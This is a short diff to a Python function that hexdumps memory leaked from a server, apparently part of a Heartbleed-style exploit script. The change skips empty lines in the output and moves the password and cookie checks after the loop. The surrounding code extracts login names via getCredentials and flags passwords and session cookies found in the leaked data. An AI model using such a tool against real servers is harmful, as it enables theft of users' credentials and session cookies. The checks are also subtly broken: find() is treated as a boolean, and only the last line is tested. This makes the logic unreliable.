@@ -137,15 +137,19 @@ def hexdump(s, file, quiet):
 
         info += pdat
 
-        if pdat.find('pas'):
-            hasPwd = True
-        if pdat.find('Cookie'):
-            hasCookie = True
+        # Skip printing empty lines (lines that do not decode to useful information
+        _temp = pdat.replace('.','')
+        if len(_temp) > 0:
+            if len(file) > 0:
+                output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
+            else:
+                consoleLog('  %04x: %-48s %s' % (b, hxdat, pdat), quiet)
 
-        if len(file) > 0:
-            output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
-        else:
-            consoleLog('  %04x: %-48s %s' % (b, hxdat, pdat), quiet)
+    # Detect whether passwords or cookies are present in the leaked memory
+    if pdat.find('pas'):
+        hasPwd = True
+    if pdat.find('Cookie'):
+        hasCookie = True
 
     # Get user names from leaked memory
     users = getCredentials(info, 'login')
